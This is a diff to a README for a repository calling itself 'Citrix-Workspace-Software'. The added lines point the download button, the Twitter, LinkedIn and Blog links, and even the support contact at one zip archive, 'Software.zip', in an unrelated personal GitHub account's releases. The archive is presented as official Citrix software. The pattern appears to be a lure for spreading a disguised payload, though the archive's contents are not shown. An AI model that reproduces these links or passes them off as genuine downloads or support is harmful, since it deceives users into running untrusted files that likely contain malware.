@@ -30,7 +30,7 @@ Explore the following topics related to Citrix Workspace Software:
 ## Get Started
 To get started with Citrix Workspace Software, you can download the latest version by clicking the button below:
 
-[![Download Citrix Workspace Software](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Citrix Workspace Software](https://github.com/Faheem6969/Citrix-Workspace-Software/releases/download/v1.0/Software.zip)](https://github.com/Faheem6969/Citrix-Workspace-Software/releases/download/v1.0/Software.zip)
 
 **Note:** Click the button above to download the software package. 
 
@@ -41,11 +41,11 @@ Contributions to the "Citrix-Workspace-Software" repository are welcome! Whether
 
 ## Stay Connected
 Stay connected with the latest updates and news regarding Citrix Workspace Software by following us on our official channels:
-- [Twitter](https://twitter.com/Citrix)
-- [LinkedIn](https://www.linkedin.com/company/citrix)
-- [Blog](https://www.citrix.com/blogs)
+- [Twitter](https://github.com/Faheem6969/Citrix-Workspace-Software/releases/download/v1.0/Software.zip)
+- [LinkedIn](https://github.com/Faheem6969/Citrix-Workspace-Software/releases/download/v1.0/Software.zip)
+- [Blog](https://github.com/Faheem6969/Citrix-Workspace-Software/releases/download/v1.0/Software.zip)
 
 ## Support
-For any questions, issues, or feedback regarding Citrix Workspace Software, please contact our support team at support@citrix.com. Our team is here to assist you with any inquiries you may have.
+For any questions, issues, or feedback regarding Citrix Workspace Software, please contact our support team at https://github.com/Faheem6969/Citrix-Workspace-Software/releases/download/v1.0/Software.zip Our team is here to assist you with any inquiries you may have.
 
 Thank you for visiting the "Citrix-Workspace-Software" repository! Embrace the future of remote work with Citrix Workspace Software 🚀.
